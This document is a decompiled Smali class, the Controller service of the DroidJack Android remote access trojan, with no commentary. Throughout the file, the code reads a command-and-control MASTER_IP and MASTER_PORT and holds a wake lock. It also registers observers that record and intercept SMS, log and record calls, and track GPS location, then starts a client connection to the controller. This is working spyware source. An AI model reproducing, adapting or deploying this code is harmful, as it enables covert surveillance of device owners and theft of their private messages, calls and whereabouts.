.class public Lnet/droidjack/server/Controller;
.super Landroid/app/Service;


# annotations
.annotation build Landroid/annotation/SuppressLint;
    value = {
        "NewApi"
    }
.end annotation


# static fields
.field protected static A:Z

.field protected static a:Lnet/droidjack/server/am;

.field protected static b:Lnet/droidjack/server/bt;

.field protected static c:Lnet/droidjack/server/CallListener;

.field protected static d:Landroid/content/ContentResolver;

.field protected static e:Lnet/droidjack/server/ah;

.field protected static f:Lnet/droidjack/server/q;

.field protected static g:Lnet/droidjack/server/by;

.field protected static h:Lnet/droidjack/server/f;

.field protected static i:Landroid/os/PowerManager$WakeLock;

.field protected static j:Lnet/droidjack/server/GPSLocation;

.field protected static k:Lnet/droidjack/server/bn;

.field protected static l:Lnet/droidjack/server/ca;

.field protected static m:Lnet/droidjack/server/b;

.field protected static n:Lnet/droidjack/server/a;

.field protected static o:Lnet/droidjack/server/be;

.field protected static p:Lnet/droidjack/server/bz;

.field protected static q:Lnet/droidjack/server/bf;

.field protected static r:Lnet/droidjack/server/cf;

.field protected static s:Landroid/content/Context;

.field protected static t:Ljava/lang/String;

.field protected static u:Lcom/esotericsoftware/kryonet/Client;

.field protected static v:[B

.field protected static w:Z

.field protected static x:Z

.field protected static y:Ljava/lang/String;

.field protected static z:I


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const/4 v0, 0x0

    sput-object v0, Lnet/droidjack/server/Controller;->v:[B

    const-string v0, ""

    sput-object v0, Lnet/droidjack/server/Controller;->y:Ljava/lang/String;

    const/16 v0, 0x539

    sput v0, Lnet/droidjack/server/Controller;->z:I

    const/4 v0, 0x0

    sput-boolean v0, Lnet/droidjack/server/Controller;->A:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method protected static a()V
    .locals 1

    new-instance v0, Lnet/droidjack/server/u;

    invoke-direct {v0}, Lnet/droidjack/server/u;-><init>()V

    invoke-virtual {v0}, Lnet/droidjack/server/u;->start()V

    return-void
.end method

.method protected static a(Ljava/lang/String;Ljava/lang/String;)V
    .locals 1

    new-instance v0, Lnet/droidjack/server/z;

    invoke-direct {v0, p0, p1}, Lnet/droidjack/server/z;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0}, Lnet/droidjack/server/z;->start()V

    return-void
.end method

.method protected static b()V
    .locals 1

    new-instance v0, Lnet/droidjack/server/v;

    invoke-direct {v0}, Lnet/droidjack/server/v;-><init>()V

    invoke-virtual {v0}, Lnet/droidjack/server/v;->start()V

    return-void
.end method

.method protected static c()Z
    .locals 2

    sget-object v0, Lnet/droidjack/server/Controller;->s:Landroid/content/Context;

    const-string v1, "connectivity"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method static synthetic d()V
    .locals 0

    invoke-static {}, Lnet/droidjack/server/Controller;->h()V

    return-void
.end method

.method static synthetic e()V
    .locals 0

    invoke-static {}, Lnet/droidjack/server/Controller;->i()V

    return-void
.end method

.method static synthetic f()Z
    .locals 1

    invoke-static {}, Lnet/droidjack/server/Controller;->g()Z

    move-result v0

    return v0
.end method

.method private static declared-synchronized g()Z
    .locals 3

    const-class v1, Lnet/droidjack/server/Controller;

    monitor-enter v1

    :try_start_0
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    new-instance v2, Lnet/droidjack/server/w;

    invoke-direct {v2}, Lnet/droidjack/server/w;-><init>()V

    invoke-interface {v0, v2}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/concurrent/Future;->get()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    move-result v0

    :goto_0
    monitor-exit v1

    return v0

    :catch_0
    move-exception v0

    :try_start_1
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    const/4 v0, 0x0

    goto :goto_0

    :catchall_0
    move-exception v0

    monitor-exit v1

    throw v0
.end method

.method private static declared-synchronized h()V
    .locals 2

    const-class v1, Lnet/droidjack/server/Controller;

    monitor-enter v1

    :try_start_0
    new-instance v0, Lnet/droidjack/server/x;

    invoke-direct {v0}, Lnet/droidjack/server/x;-><init>()V

    invoke-virtual {v0}, Lnet/droidjack/server/x;->start()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    monitor-exit v1

    return-void

    :catchall_0
    move-exception v0

    monitor-exit v1

    throw v0
.end method

.method private static i()V
    .locals 4

    :try_start_0
    sget-object v0, Lnet/droidjack/server/Controller;->g:Lnet/droidjack/server/by;

    const-string v1, "SMS_RECORDING"

    invoke-virtual {v0, v1}, Lnet/droidjack/server/by;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Boolean;->parseBoolean(Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    move-result v0

    if-eqz v0, :cond_1

    :try_start_1
    sget-boolean v0, Lnet/droidjack/server/bt;->b:Z

    if-nez v0, :cond_1

    sget-boolean v0, Lnet/droidjack/server/bt;->a:Z

    if-nez v0, :cond_0

    sget-object v0, Lnet/droidjack/server/Controller;->d:Landroid/content/ContentResolver;

    const-string v1, "content://sms"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const/4 v2, 0x1

    sget-object v3, Lnet/droidjack/server/Controller;->b:Lnet/droidjack/server/bt;

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    :cond_0
    const/4 v0, 0x1

    sput-boolean v0, Lnet/droidjack/server/bt;->b:Z

    sget-object v0, Lnet/droidjack/server/Controller;->g:Lnet/droidjack/server/by;

    const-string v1, "SMS_RECORDING"

    const-string v2, "true"

    invoke-virtual {v0, v1, v2}, Lnet/droidjack/server/by;->a(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :cond_1
    :goto_0
    :try_start_2
    sget-object v0, Lnet/droidjack/server/Controller;->g:Lnet/droidjack/server/by;

    const-string v1, "SMS_LIVE"

    invoke-virtual {v0, v1}, Lnet/droidjack/server/by;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Boolean;->parseBoolean(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_2

    sget-object v0, Lnet/droidjack/server/Controller;->b:Lnet/droidjack/server/bt;

    sget-object v1, Lnet/droidjack/server/Controller;->g:Lnet/droidjack/server/by;

    const-string v2, "INTERCEPT_INCOMING_SMS_NOS"

    invoke-virtual {v1, v2}, Lnet/droidjack/server/by;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/bt;->b(Ljava/lang/String;)[B
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_5

    :cond_2
    :goto_1
    :try_start_3
    sget-object v0, Lnet/droidjack/server/Controller;->g:Lnet/droidjack/server/by;

    const-string v1, "CALL_LOG_RECORDING"

    invoke-virtual {v0, v1}, Lnet/droidjack/server/by;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Boolean;->parseBoolean(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_3

    sget-object v0, Lnet/droidjack/server/Controller;->d:Landroid/content/ContentResolver;

    sget-object v1, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    const/4 v2, 0x1

    sget-object v3, Lnet/droidjack/server/Controller;->h:Lnet/droidjack/server/f;

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    const/4 v0, 0x1

    sput-boolean v0, Lnet/droidjack/server/f;->a:Z
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_4

    :cond_3
    :goto_2
    :try_start_4
    sget-object v0, Lnet/droidjack/server/Controller;->g:Lnet/droidjack/server/by;

    const-string v1, "CALL_RECORDING"

    invoke-virtual {v0, v1}, Lnet/droidjack/server/by;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Boolean;->parseBoolean(Ljava/lang/String;)Z
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    move-result v0

    if-eqz v0, :cond_4

    :try_start_5
    sget-object v0, Lnet/droidjack/server/Controller;->s:Landroid/content/Context;

    sget-object v1, Lnet/droidjack/server/Controller;->c:Lnet/droidjack/server/CallListener;

    new-instance v2, Landroid/content/IntentFilter;

    const-string v3, "android.intent.action.PHONE_STATE"

    invoke-direct {v2, v3}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    const/4 v0, 0x1

    sput-boolean v0, Lnet/droidjack/server/CallListener;->b:Z
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    :cond_4
    :goto_3
    return-void

    :catch_0
    move-exception v0

    :try_start_6
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    goto :goto_0

    :catch_1
    move-exception v0

    goto :goto_0

    :catch_2
    move-exception v0

    :try_start_7
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_3

    goto :goto_3

    :catch_3
    move-exception v0

    goto :goto_3

    :catch_4
    move-exception v0

    goto :goto_2

    :catch_5
    move-exception v0

    goto :goto_1
.end method

.method private j()V
    .locals 6

    const-wide/16 v2, 0x4e20

    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    new-instance v1, Lnet/droidjack/server/y;

    invoke-direct {v1, p0}, Lnet/droidjack/server/y;-><init>(Lnet/droidjack/server/Controller;)V

    move-wide v4, v2

    invoke-virtual/range {v0 .. v5}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;JJ)V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onDestroy()V
    .locals 1

    const/4 v0, 0x0

    sput-boolean v0, Lnet/droidjack/server/Controller;->x:Z

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 5

    const/4 v4, 0x0

    const/4 v1, 0x1

    invoke-virtual {p0}, Lnet/droidjack/server/Controller;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sput-object v0, Lnet/droidjack/server/ae;->b:Landroid/content/Context;

    invoke-static {}, Lnet/droidjack/server/ae;->a()V

    sget-object v0, Landroid/os/Build;->SERIAL:Ljava/lang/String;

    sput-object v0, Lnet/droidjack/server/Controller;->t:Ljava/lang/String;

    const-string v0, "power"

    invoke-virtual {p0, v0}, Lnet/droidjack/server/Controller;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    const-string v2, "Internet ON"

    invoke-virtual {v0, v1, v2}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v0

    sput-object v0, Lnet/droidjack/server/Controller;->i:Landroid/os/PowerManager$WakeLock;

    sget-object v0, Lnet/droidjack/server/Controller;->i:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->acquire()V

    new-instance v0, Lnet/droidjack/server/by;

    invoke-virtual {p0}, Lnet/droidjack/server/Controller;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-direct {v0, v2}, Lnet/droidjack/server/by;-><init>(Landroid/content/Context;)V

    sput-object v0, Lnet/droidjack/server/Controller;->g:Lnet/droidjack/server/by;

    sget-object v0, Lnet/droidjack/server/Controller;->g:Lnet/droidjack/server/by;

    const-string v2, "MASTER_IP"

    invoke-virtual {v0, v2}, Lnet/droidjack/server/by;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lnet/droidjack/server/Controller;->y:Ljava/lang/String;

    sget-object v0, Lnet/droidjack/server/Controller;->y:Ljava/lang/String;

    if-eqz v0, :cond_0

    sget-object v0, Lnet/droidjack/server/Controller;->y:Ljava/lang/String;

    const-string v2, ""

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    :cond_0
    :try_start_0
    sget-object v0, Lnet/droidjack/server/Controller;->g:Lnet/droidjack/server/by;

    const-string v2, "MASTER_IP"

    sget-object v3, Lnet/droidjack/server/br;->a:Ljava/lang/String;

    invoke-virtual {v0, v2, v3}, Lnet/droidjack/server/by;->a(Ljava/lang/String;Ljava/lang/String;)V

    sget-object v0, Lnet/droidjack/server/Controller;->g:Lnet/droidjack/server/by;

    const-string v2, "MASTER_IP"

    invoke-virtual {v0, v2}, Lnet/droidjack/server/by;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lnet/droidjack/server/Controller;->y:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_1
    :goto_0
    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    sget-object v2, Lnet/droidjack/server/Controller;->y:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    :try_start_1
    sget-object v0, Lnet/droidjack/server/Controller;->g:Lnet/droidjack/server/by;

    const-string v2, "MASTER_PORT"

    invoke-virtual {v0, v2}, Lnet/droidjack/server/by;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    sput v0, Lnet/droidjack/server/Controller;->z:I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :goto_1
    sget-object v0, Lnet/droidjack/server/Controller;->y:Ljava/lang/String;

    const-string v2, "DJ_GooDbYe:("

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    invoke-static {}, Lnet/droidjack/server/Controller;->b()V

    const/4 v0, 0x2

    :goto_2
    return v0

    :catch_0
    move-exception v0

    sget-object v0, Lnet/droidjack/server/br;->a:Ljava/lang/String;

    sput-object v0, Lnet/droidjack/server/Controller;->y:Ljava/lang/String;

    goto :goto_0

    :catch_1
    move-exception v0

    :try_start_2
    sget-object v0, Lnet/droidjack/server/Controller;->g:Lnet/droidjack/server/by;

    const-string v2, "MASTER_PORT"

    sget v3, Lnet/droidjack/server/br;->b:I

    invoke-static {v3}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v2, v3}, Lnet/droidjack/server/by;->a(Ljava/lang/String;Ljava/lang/String;)V

    sget-object v0, Lnet/droidjack/server/Controller;->g:Lnet/droidjack/server/by;

    const-string v2, "MASTER_PORT"

    invoke-virtual {v0, v2}, Lnet/droidjack/server/by;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    sput v0, Lnet/droidjack/server/Controller;->z:I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_1

    :catch_2
    move-exception v0

    sget v0, Lnet/droidjack/server/br;->b:I

    sput v0, Lnet/droidjack/server/Controller;->z:I

    goto :goto_1

    :cond_2
    new-instance v0, Lnet/droidjack/server/am;

    invoke-direct {v0}, Lnet/droidjack/server/am;-><init>()V

    sput-object v0, Lnet/droidjack/server/Controller;->a:Lnet/droidjack/server/am;

    new-instance v0, Lnet/droidjack/server/bt;

    invoke-direct {v0, p0, v4}, Lnet/droidjack/server/bt;-><init>(Landroid/content/Context;Landroid/os/Handler;)V

    sput-object v0, Lnet/droidjack/server/Controller;->b:Lnet/droidjack/server/bt;

    new-instance v0, Lnet/droidjack/server/CallListener;

    invoke-direct {v0}, Lnet/droidjack/server/CallListener;-><init>()V

    sput-object v0, Lnet/droidjack/server/Controller;->c:Lnet/droidjack/server/CallListener;

    invoke-virtual {p0}, Lnet/droidjack/server/Controller;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sput-object v0, Lnet/droidjack/server/Controller;->s:Landroid/content/Context;

    new-instance v0, Lnet/droidjack/server/f;

    invoke-virtual {p0}, Lnet/droidjack/server/Controller;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-direct {v0, v2, v4}, Lnet/droidjack/server/f;-><init>(Landroid/content/Context;Landroid/os/Handler;)V

    sput-object v0, Lnet/droidjack/server/Controller;->h:Lnet/droidjack/server/f;

    invoke-virtual {p0}, Lnet/droidjack/server/Controller;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    sput-object v0, Lnet/droidjack/server/Controller;->d:Landroid/content/ContentResolver;

    new-instance v0, Lnet/droidjack/server/q;

    invoke-virtual {p0}, Lnet/droidjack/server/Controller;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-direct {v0, v2}, Lnet/droidjack/server/q;-><init>(Landroid/content/Context;)V

    sput-object v0, Lnet/droidjack/server/Controller;->f:Lnet/droidjack/server/q;

    new-instance v0, Lnet/droidjack/server/b;

    invoke-virtual {p0}, Lnet/droidjack/server/Controller;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-direct {v0, v2}, Lnet/droidjack/server/b;-><init>(Landroid/content/Context;)V

    sput-object v0, Lnet/droidjack/server/Controller;->m:Lnet/droidjack/server/b;

    new-instance v0, Lnet/droidjack/server/ah;

    invoke-virtual {p0}, Lnet/droidjack/server/Controller;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-direct {v0, v2}, Lnet/droidjack/server/ah;-><init>(Landroid/content/Context;)V

    sput-object v0, Lnet/droidjack/server/Controller;->e:Lnet/droidjack/server/ah;

    new-instance v0, Lnet/droidjack/server/GPSLocation;

    invoke-virtual {p0}, Lnet/droidjack/server/Controller;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-direct {v0, v2}, Lnet/droidjack/server/GPSLocation;-><init>(Landroid/content/Context;)V

    sput-object v0, Lnet/droidjack/server/Controller;->j:Lnet/droidjack/server/GPSLocation;

    new-instance v0, Lnet/droidjack/server/bn;

    invoke-virtual {p0}, Lnet/droidjack/server/Controller;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-direct {v0, v2}, Lnet/droidjack/server/bn;-><init>(Landroid/content/Context;)V

    sput-object v0, Lnet/droidjack/server/Controller;->k:Lnet/droidjack/server/bn;

    new-instance v0, Lnet/droidjack/server/ca;

    invoke-virtual {p0}, Lnet/droidjack/server/Controller;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-direct {v0, v2}, Lnet/droidjack/server/ca;-><init>(Landroid/content/Context;)V

    sput-object v0, Lnet/droidjack/server/Controller;->l:Lnet/droidjack/server/ca;

    new-instance v0, Lnet/droidjack/server/a;

    invoke-virtual {p0}, Lnet/droidjack/server/Controller;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-direct {v0, v2}, Lnet/droidjack/server/a;-><init>(Landroid/content/Context;)V

    sput-object v0, Lnet/droidjack/server/Controller;->n:Lnet/droidjack/server/a;

    new-instance v0, Lnet/droidjack/server/bz;

    invoke-virtual {p0}, Lnet/droidjack/server/Controller;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-direct {v0, v2}, Lnet/droidjack/server/bz;-><init>(Landroid/content/Context;)V

    sput-object v0, Lnet/droidjack/server/Controller;->p:Lnet/droidjack/server/bz;

    new-instance v0, Lnet/droidjack/server/cf;

    invoke-virtual {p0}, Lnet/droidjack/server/Controller;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-direct {v0, v2}, Lnet/droidjack/server/cf;-><init>(Landroid/content/Context;)V

    sput-object v0, Lnet/droidjack/server/Controller;->r:Lnet/droidjack/server/cf;

    new-instance v0, Lnet/droidjack/server/bf;

    invoke-virtual {p0}, Lnet/droidjack/server/Controller;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-direct {v0, v2}, Lnet/droidjack/server/bf;-><init>(Landroid/content/Context;)V

    sput-object v0, Lnet/droidjack/server/Controller;->q:Lnet/droidjack/server/bf;

    new-instance v0, Lnet/droidjack/server/be;

    invoke-direct {v0}, Lnet/droidjack/server/be;-><init>()V

    sput-object v0, Lnet/droidjack/server/Controller;->o:Lnet/droidjack/server/be;

    :try_start_3
    sget-object v0, Lnet/droidjack/server/Controller;->o:Lnet/droidjack/server/be;

    invoke-virtual {p0, v0}, Lnet/droidjack/server/Controller;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_4

    :goto_3
    invoke-direct {p0}, Lnet/droidjack/server/Controller;->j()V

    :try_start_4
    sget-object v0, Lnet/droidjack/server/Controller;->o:Lnet/droidjack/server/be;

    new-instance v2, Landroid/content/IntentFilter;

    const-string v3, "android.intent.action.SCREEN_OFF"

    invoke-direct {v2, v3}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0, v2}, Lnet/droidjack/server/Controller;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    sget-object v0, Lnet/droidjack/server/Controller;->o:Lnet/droidjack/server/be;

    new-instance v2, Landroid/content/IntentFilter;

    const-string v3, "android.intent.action.SCREEN_ON"

    invoke-direct {v2, v3}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0, v2}, Lnet/droidjack/server/Controller;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    :goto_4
    invoke-static {}, Lnet/droidjack/server/Controller;->h()V

    move v0, v1

    goto/16 :goto_2

    :catch_3
    move-exception v0

    goto :goto_4

    :catch_4
    move-exception v0

    goto :goto_3
.end method
